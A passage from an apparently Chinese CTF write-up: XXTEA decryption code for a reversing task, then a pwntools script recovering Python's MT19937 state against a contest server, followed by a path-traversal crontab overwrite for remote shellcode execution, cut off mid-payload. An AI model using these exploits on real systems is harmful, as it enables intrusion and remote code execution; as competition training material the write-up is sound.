punctuation\">(</span>p <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n                z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">else</span>\n                z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">==</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n                y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">else</span>\n                y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>p <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n            v<span class=\"token punctuation\">[</span>p<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> MX<span class=\"token punctuation\">;</span>\n            \n        <span class=\"token punctuation\">&#125;</span>\n        sum <span class=\"token operator\">-=</span> DELTA<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">--</span>rounds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">xxtea_decrypt2</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span><span class=\"token operator\">*</span> v<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">uint32_t</span> y<span class=\"token punctuation\">,</span> z<span class=\"token punctuation\">,</span> sum<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> rounds<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">;</span>\n    rounds <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span>\n    sum <span class=\"token operator\">=</span> DELTA <span class=\"token operator\">*</span> rounds<span class=\"token punctuation\">;</span>\n    y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">do</span>\n    <span class=\"token punctuation\">&#123;</span>\n        e <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>sum <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> p <span class=\"token operator\">=</span> <span class=\"token number\">5</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> p <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> p<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n                z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">else</span>\n                z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">==</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n                y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">else</span>\n                y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>p <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n            v<span class=\"token punctuation\">[</span>p<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> MX2<span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">&#125;</span>\n        sum <span class=\"token operator\">-=</span> DELTA<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">--</span>rounds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> enc1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span>\n    <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token number\">0x5D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB1</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x3E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x69</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> enc2<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span>\n    <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token number\">0xDE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAB</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x27</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x16</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">xxtea_decrypt1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>enc1<span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">xxtea_decrypt2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>enc2<span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%.20s%.20s\\n\"</span><span class=\"token punctuation\">,</span> enc1<span class=\"token punctuation\">,</span>enc2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n\n\n<h2 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h2><h3 id=\"X1crypsc\"><a href=\"#X1crypsc\" class=\"headerlink\" title=\"X1crypsc\"></a><font style=\"color:#000000;\">X1crypsc</font></h3><p>题目使用random库生成随机数，基于mt19937-32算法，选择W可以任意获取随机数数据，构造矩阵即可逆向mt19937的状态，即可预测随机数，攻击成功后进入下面的黑盒阶段。</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> Random\n<span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> tqdm <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\n<span class=\"token comment\"># ==========================</span>\n<span class=\"token comment\">#  Phase 1: 收集PRNG输出数据</span>\n<span class=\"token comment\"># ==========================</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">collect_bits</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Collecting 624*32 bits for MT19937 state...\"</span><span class=\"token punctuation\">)</span>\n    \n    bits_collected <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    D<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">while</span> bits_collected <span class=\"token operator\">&lt;</span> <span class=\"token number\">625</span> <span class=\"token operator\">*</span> <span class=\"token number\">32</span><span class=\"token punctuation\">:</span>  \n        p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'option:'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'W'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 选择武器刷新</span>\n        p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Current attack value: '</span><span class=\"token punctuation\">)</span>\n        line <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        low<span class=\"token punctuation\">,</span> high <span class=\"token operator\">=</span> <span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> line<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' ~ '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        base <span class=\"token operator\">=</span> low\n        add <span class=\"token operator\">=</span> high <span class=\"token operator\">-</span> base \n        \n        val1 <span class=\"token operator\">=</span> base\n        val2 <span class=\"token operator\">=</span> add\n\n        D<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>val1<span class=\"token punctuation\">)</span>\n        D<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>val2<span class=\"token punctuation\">)</span>\n        p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'y'</span><span class=\"token punctuation\">)</span>\n        bits_collected <span class=\"token operator\">+=</span> <span class=\"token number\">32</span>\n        \n        sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"\\rBits collected: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>bits_collected<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">/20000\"</span></span><span class=\"token punctuation\">)</span>\n        sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>flush<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        \n        <span class=\"token comment\"># 发送'n'不继续刷新</span>\n        p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'?'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'n'</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>D<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> D\n\n<span class=\"token comment\"># ==========================</span>\n<span class=\"token comment\">#  Phase 2: 预测坐标并攻击</span>\n<span class=\"token comment\"># ==========================</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">attack_monster</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> predictor<span class=\"token punctuation\">,</span>D<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[+]'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\"># 预测下一个randrange(2025) x和y</span>\n        x <span class=\"token operator\">=</span> predictor<span class=\"token punctuation\">.</span>randrange<span class=\"token punctuation\">(</span><span class=\"token number\">2025</span><span class=\"token punctuation\">)</span>\n        y <span class=\"token operator\">=</span> predictor<span class=\"token punctuation\">.</span>randrange<span class=\"token punctuation\">(</span><span class=\"token number\">2025</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># 发送攻击指令</span>\n        p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'option:'</span><span class=\"token punctuation\">)</span>\n        p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'A'</span><span class=\"token punctuation\">)</span>\n        p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'aim:'</span><span class=\"token punctuation\">)</span>\n        p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>x<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>y<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        \n        resp <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        \n        a<span class=\"token operator\">=</span>predictor<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span>D<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>D<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token string\">b'Victory'</span> <span class=\"token keyword\">in</span> p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'-------------------------------------------------'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span>\n    \n\n<span class=\"token comment\">#--------------------------------------------------------------</span>\n\ncontext<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">\"debug\"</span><span class=\"token punctuation\">)</span>\np <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'39.106.16.204'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11448</span><span class=\"token punctuation\">)</span> \n\nDall <span class=\"token operator\">=</span> collect_bits<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>Dall<span class=\"token punctuation\">)</span>\n\nn<span class=\"token operator\">=</span><span class=\"token number\">1250</span>\nD<span class=\"token operator\">=</span>Dall<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span>n<span class=\"token punctuation\">]</span>\nrng<span class=\"token operator\">=</span>Random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">getRows</span><span class=\"token punctuation\">(</span>rng<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    row<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        row<span class=\"token operator\">+=</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">(</span>rng<span class=\"token punctuation\">.</span>getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>zfill<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> row\nM<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">19968</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    state <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span><span class=\"token number\">624</span>\n    temp <span class=\"token operator\">=</span> <span class=\"token string\">\"0\"</span><span class=\"token operator\">*</span>i <span class=\"token operator\">+</span> <span class=\"token string\">\"1\"</span><span class=\"token operator\">*</span><span class=\"token number\">1</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"0\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">19968</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">-</span>i<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">624</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        state<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token operator\">*</span>j<span class=\"token punctuation\">:</span><span class=\"token number\">32</span><span class=\"token operator\">*</span>j<span class=\"token operator\">+</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    rng<span class=\"token punctuation\">.</span>setstate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">tuple</span><span class=\"token punctuation\">(</span>state<span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token number\">624</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n    M<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>getRows<span class=\"token punctuation\">(</span>rng<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'--------------------------------------------------'</span><span class=\"token punctuation\">)</span>\nM<span class=\"token operator\">=</span>Matrix<span class=\"token punctuation\">(</span>GF<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>M<span class=\"token punctuation\">)</span>\ny<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    y<span class=\"token operator\">+=</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">(</span>D<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>zfill<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\ny<span class=\"token operator\">=</span>vector<span class=\"token punctuation\">(</span>GF<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span>\ns<span class=\"token operator\">=</span>M<span class=\"token punctuation\">.</span>solve_left<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span>\nG<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">624</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    C<span class=\"token operator\">=</span><span class=\"token number\">0</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        C<span class=\"token operator\">&lt;&lt;</span><span class=\"token operator\">=</span><span class=\"token number\">1</span>\n        C<span class=\"token operator\">|</span><span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token operator\">*</span>i<span class=\"token operator\">+</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    G<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>C<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">import</span> random\nRNG1 <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>Random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">624</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    G<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>G<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\nRNG1<span class=\"token punctuation\">.</span>setstate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">tuple</span><span class=\"token punctuation\">(</span>G<span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">624</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#------------------------------------------------------------</span>\n<span class=\"token comment\">#控制到当前状态</span>\nRNG1<span class=\"token punctuation\">.</span>getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">)</span>\nss<span class=\"token operator\">=</span><span class=\"token number\">0</span>\nd1<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">while</span> ss <span class=\"token operator\">&lt;</span> <span class=\"token number\">625</span> <span class=\"token operator\">*</span> <span class=\"token number\">32</span><span class=\"token punctuation\">:</span>\n    d1<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>RNG1<span class=\"token punctuation\">.</span>getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    d1<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>RNG1<span class=\"token punctuation\">.</span>getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    ss <span class=\"token operator\">+=</span> <span class=\"token number\">32</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>d1<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">10</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'------------att-------------'</span><span class=\"token punctuation\">)</span>\nattack_monster<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> RNG1<span class=\"token punctuation\">,</span>Dall<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#--------------------------------------------------------------</span></code></pre>\n\n<p>黑盒部分：</p>\n<p>只有输入文件名以及输入文件内容这些功能</p>\n<p>发现可以文件名任意写，覆盖crontab定时任务，执行shellcode来远程操控</p>\n<pre class=\"language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>//<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>//<span class=\"token punctuation\">..</span><span 